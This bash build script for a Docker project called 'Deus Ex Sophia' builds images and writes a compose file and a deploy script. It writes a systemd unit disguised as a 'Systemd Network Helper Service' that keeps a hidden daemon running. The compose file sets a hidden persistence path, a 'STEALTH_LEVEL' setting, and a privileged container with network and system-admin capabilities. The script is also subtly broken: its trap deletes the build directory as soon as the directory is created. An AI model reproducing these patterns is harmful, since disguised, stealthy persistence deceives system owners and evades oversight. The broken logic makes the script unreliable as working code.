#!/bin/bash
# build.sh - Deus Ex Sophia Docker Build Script

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Configuration
REPO_NAME="deus-ex-sophia"
VERSION="5.0"
REGISTRY=""
PLATFORMS="linux/amd64,linux/arm64"

# Log function
log() {
    echo -e "${GREEN}[+]${NC} $1"
}

error() {
    echo -e "${RED}[!]${NC} $1"
    exit 1
}

# Check prerequisites
check_prerequisites() {
    log "Checking prerequisites..."
    
    # Check Docker
    if ! command -v docker &> /dev/null; then
        error "Docker is not installed"
    fi
    
    # Check Docker Compose
    if ! command -v docker-compose &> /dev/null; then
        error "Docker Compose is not installed"
    fi
    
    # Check buildx
    if ! docker buildx version &> /dev/null; then
        error "Docker Buildx is not available"
    fi
    
    log "Prerequisites satisfied"
}

# Create build context
prepare_build_context() {
    log "Preparing build context..."
    
    # Create temporary directory
    BUILD_DIR=$(mktemp -d)
    trap "rm -rf $BUILD_DIR" EXIT
    
    # Copy necessary files
    cp Dockerfile "$BUILD_DIR/"
    cp requirements.txt "$BUILD_DIR/"
    cp entrypoint.sh "$BUILD_DIR/"
    cp init.sh "$BUILD_DIR/"
    
    # Copy system files
    mkdir -p "$BUILD_DIR/phases"
    mkdir -p "$BUILD_DIR/scripts"
    mkdir -p "$BUILD_DIR/config"
    mkdir -p "$BUILD_DIR/systemd"
    mkdir -p "$BUILD_DIR/cron"
    mkdir -p "$BUILD_DIR/ssh"
    mkdir -p "$BUILD_DIR/network"
    
    # Copy phases (assuming they're in parent directory)
    cp -r ../phases/* "$BUILD_DIR/phases/" 2>/dev/null || true
    cp -r ../scripts/* "$BUILD_DIR/scripts/" 2>/dev/null || true
    
    # Create minimal configs if not exists
    if [ ! -f "$BUILD_DIR/config/core.json" ]; then
        cat > "$BUILD_DIR/config/core.json" << 'EOF'
{"version": "5.0", "environment": "docker"}
EOF
    fi
    
    # Create systemd service files
    cat > "$BUILD_DIR/systemd/systemd-networkd-helper.service" << 'EOF'
[Unit]
Description=Systemd Network Helper Service
After=network.target

[Service]
Type=simple
ExecStart=/opt/sysaux/bin/core_truth.py --daemon
Restart=always

[Install]
WantedBy=multi-user.target
EOF
    
    echo "$BUILD_DIR"
}

# Build single image
build_image() {
    local context=$1
    local tag=$2
    local target=$3
    
    log "Building image: $tag"
    
    docker buildx build \
        --platform "$PLATFORMS" \
        --tag "$tag" \
        --target "$target" \
        --progress plain \
        "$context"
}

# Build multi-architecture images
build_multiarch() {
    local context=$1
    
    log "Building multi-architecture images..."
    
    # Create builder instance
    docker buildx create --name sophia-builder --use 2>/dev/null || true
    docker buildx inspect --bootstrap
    
    # Build and push images
    for component in core network matrix dashboard; do
        local tag="${REGISTRY}${REPO_NAME}/${component}:${VERSION}"
        local tag_latest="${REGISTRY}${REPO_NAME}/${component}:latest"
        
        log "Building $component..."
        
        docker buildx build \
            --platform "$PLATFORMS" \
            --tag "$tag" \
            --tag "$tag_latest" \
            --target "$component" \
            --progress plain \
            --push \
            "$context"
    done
    
    log "Multi-architecture build complete"
}

# Create Docker Compose file
create_compose_file() {
    log "Creating Docker Compose file..."
    
    cat > docker-compose.prod.yml << 'EOF'
version: '3.8'

services:
  sophia-core:
    image: ${REGISTRY}deus-ex-sophia/core:${VERSION:-latest}
    container_name: sophia-core
    restart: unless-stopped
    privileged: true
    cap_add:
      - NET_ADMIN
      - NET_RAW
      - SYS_ADMIN
    volumes:
      - sophia-data:/opt/sysaux
      - sophia-persistence:/usr/local/lib/.systemd-aux
    networks:
      - sophia-net
    environment:
      - SOPHIA_ENV=production
      - SOPHIA_STEALTH_LEVEL=9
    healthcheck:
      test: ["CMD", "/opt/sysaux/bin/resilience.sh", "check"]
      interval: 30s
      timeout: 10s
      retries: 3

  network-oracle:
    image: ${REGISTRY}deus-ex-sophia/network:${VERSION:-latest}
    container_name: network-oracle
    restart: unless-stopped
    network_mode: service:sophia-core
    volumes:
      - sophia-data:/opt/sysaux/.network
    depends_on:
      - sophia-core
    environment:
      - SOPHIA_NETWORK_ENABLED=true

  matrix-orchestrator:
    image: ${REGISTRY}deus-ex-sophia/matrix:${VERSION:-latest}
    container_name: matrix-orchestrator
    restart: unless-stopped
    volumes:
      - sophia-data:/opt/sysaux/.matrix
    depends_on:
      - network-oracle
    environment:
      - SOPHIA_MATRIX_ENABLED=true

  dashboard:
    image: ${REGISTRY}deus-ex-sophia/dashboard:${VERSION:-latest}
    container_name: sophia-dashboard
    restart: unless-stopped
    ports:
      - "8080:8080"
      - "8443:8443"
    volumes:
      - dashboard-data:/var/www/html
    depends_on:
      - matrix-orchestrator

volumes:
  sophia-data:
  sophia-persistence:
  dashboard-data:

networks:
  sophia-net:
    driver: bridge
EOF
    
    log "Docker Compose file created: docker-compose.prod.yml"
}

# Create deployment script
create_deploy_script() {
    log "Creating deployment script..."
    
    cat > deploy.sh << 'EOF'
#!/bin/bash
# deploy.sh - Deus Ex Sophia Deployment

set -e

# Configuration
REGISTRY="${REGISTRY:-}"
VERSION="${VERSION:-5.0}"
COMPOSE_FILE="docker-compose.prod.yml"

# Pull images
echo "[+] Pulling images..."
docker-compose -f "$COMPOSE_FILE" pull

# Stop existing services
echo "[+] Stopping existing services..."
docker-compose -f "$COMPOSE_FILE" down

# Start services
echo "[+] Starting services..."
docker-compose -f "$COMPOSE_FILE" up -d

# Wait for services to be healthy
echo "[+] Waiting for services to be ready..."
sleep 30

# Check status
echo "[+] Checking service status..."
docker-compose -f "$COMPOSE_FILE" ps

echo "[✓] Deployment complete!"
echo "[*] Dashboard: http://localhost:8080"
echo "[*] CLI: docker exec -it sophia-core ascend"
EOF
    
    chmod +x deploy.sh
    log "Deployment script created: deploy.sh"
}

# Main execution
main() {
    check_prerequisites
    
    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case $1 in
            --registry)
                REGISTRY="$2/"
                shift 2
                ;;
            --version)
                VERSION="$2"
                shift 2
                ;;
            --platforms)
                PLATFORMS="$2"
                shift 2
                ;;
            *)
                error "Unknown option: $1"
                ;;
        esac
    done
    
    # Prepare build context
    CONTEXT=$(prepare_build_context)
    
    # Build images
    build_multiarch "$CONTEXT"
    
    # Create deployment files
    create_compose_file
    create_deploy_script
    
    log "Build complete!"
    log "Images available:"
    log "  - ${REGISTRY}deus-ex-sophia/core:${VERSION}"
    log "  - ${REGISTRY}deus-ex-sophia/network:${VERSION}"
    log "  - ${REGISTRY}deus-ex-sophia/matrix:${VERSION}"
    log "  - ${REGISTRY}deus-ex-sophia/dashboard:${VERSION}"
    log ""
    log "To deploy:"
    log "  1. Edit docker-compose.prod.yml if needed"
    log "  2. Run: ./deploy.sh"
    log "  3. Access dashboard at http://localhost:8080"
}

# Run main
main "$@"